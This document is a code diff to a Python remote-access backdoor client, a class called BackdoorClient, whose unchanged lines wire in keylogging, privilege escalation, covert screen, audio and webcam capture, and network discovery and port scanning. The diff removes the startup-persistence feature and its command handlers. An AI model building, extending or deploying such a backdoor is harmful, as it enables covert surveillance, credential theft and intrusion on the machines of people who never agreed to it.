@@ -22,7 +22,6 @@ try:
     from features.privilege_escalation import PrivilegeEscalation
     from features.screen_audio_capture import ScreenCapture, AudioCapture, WebcamCapture
     from features.network_discovery import NetworkDiscovery
-    from features.persistence import Persistence
     FEATURES_AVAILABLE = True
 except ImportError:
     FEATURES_AVAILABLE = False
@@ -45,7 +44,6 @@ class BackdoorClient:
             self.audio_capture = AudioCapture()
             self.webcam_capture = WebcamCapture()
             self.network_discovery = NetworkDiscovery()
-            self.persistence = Persistence()
         else:
             self.keylogger = None
             self.priv_esc = None
@@ -53,7 +51,6 @@ class BackdoorClient:
             self.audio_capture = None
             self.webcam_capture = None
             self.network_discovery = None
-            self.persistence = None
     
     def reliable_send(self, data):
         """Send data in a reliable way (encoded as JSON)"""
@@ -340,31 +337,6 @@ class BackdoorClient:
                     self.reliable_send("Network discovery feature not available")
                 return 'continue'
             
-            # Persistence commands
-            elif command == 'persist_install':
-                if self.persistence:
-                    result = self.persistence.add_to_startup()
-                    self.reliable_send(result)
-                else:
-                    self.reliable_send("Persistence feature not available")
-                return 'continue'
-            
-            elif command == 'persist_remove':
-                if self.persistence:
-                    result = self.persistence.remove_persistence()
-                    self.reliable_send(result)
-                else:
-                    self.reliable_send("Persistence feature not available")
-                return 'continue'
-            
-            elif command == 'persist_check':
-                if self.persistence:
-                    result = self.persistence.check_persistence()
-                    self.reliable_send(result)
-                else:
-                    self.reliable_send("Persistence feature not available")
-                return 'continue'
-            
             # System information
             elif command == 'sysinfo':
                 result = self.get_system_info()
@@ -432,11 +404,6 @@ class BackdoorClient:
         net_portscan <host> - Scan common ports on host
         net_public_ip       - Get public IP address
         net_check_internet  - Check internet connectivity
-
-        PERSISTENCE:
-        persist_install     - Install persistence mechanism
-        persist_remove      - Remove persistence
-        persist_check       - Check persistence status
 
         Note: Some features require additional libraries (pynput, PIL, pyaudio, opencv-python)
         """
